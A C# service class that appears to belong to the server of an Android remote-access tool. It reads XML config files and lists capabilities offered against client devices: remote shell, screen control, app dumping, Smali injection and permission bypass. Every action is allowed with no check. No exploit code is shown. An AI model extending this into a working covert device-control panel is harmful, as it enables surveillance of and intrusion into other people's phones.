using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Xml.Linq;
using System.Net;
using System.Threading;
using System.Windows;

namespace TcpServerApp.Services.Elite
{
    public class ActionConfigService
    {
        private readonly string _configPath;

        public ActionConfigService()
        {
            _configPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "GeoIP", "Config");
        }

        public List<string> GetSupportedExtensions(string type)
        {
            try
            {
                string fileName = $"supported_{type}.inf";
                string fullPath = System.IO.Path.Combine(_configPath, fileName);
                
                if (!System.IO.File.Exists(fullPath)) return new List<string>();

                string content = System.IO.File.ReadAllText(fullPath);
                var doc = XDocument.Parse(content);
                return doc.Descendants("param")
                          .Select(p => p.Attribute("name")?.Value ?? "")
                          .Where(v => !string.IsNullOrEmpty(v))
                          .ToList();
            }
            catch
            {
                return new List<string>();
            }
        }

        public Dictionary<string, string> GetMapParams()
        {
            try
            {
                string fullPath = System.IO.Path.Combine(_configPath, "maps.inf");
                if (!System.IO.File.Exists(fullPath)) return new Dictionary<string, string>();

                string content = System.IO.File.ReadAllText(fullPath);
                var doc = XDocument.Parse(content);
                return doc.Descendants("param")
                          .ToDictionary(
                              p => p.Attribute("name")?.Value ?? "unknown",
                              p => p.Value
                          );
            }
            catch
            {
                return new Dictionary<string, string>();
            }
        }

        public List<string> GetAllRealActions()
        {
            // Derived from filenames + specific internal logic
            return new List<string>
            {
                "Screen Control",
                "File Management",
                "Remote Shell",
                "App Dumping (F4)",
                "System Intent (F9)",
                "Smali Injection (F3)",
                "Permission Bypass",
                "Sensor Fusion",
                "Privacy Sandbox Audit"
            };
        }

        public bool IsActionAllowed(string actionName, string clientId)
        {
            // Default implementation - allow all actions
            // Can be extended to check permissions based on client configuration
            return true;
        }

        public ActionConfig? GetAction(string actionName)
        {
            // Return action configuration if exists
            var allActions = GetAllRealActions();
            if (allActions.Contains(actionName))
            {
                return new ActionConfig 
                { 
                    Name = actionName, 
                    IsEnabled = true 
                };
            }
            return null;
        }
    }

    public class ActionConfig
    {
        public string Name { get; set; }
        public bool IsEnabled { get; set; }
    }
}
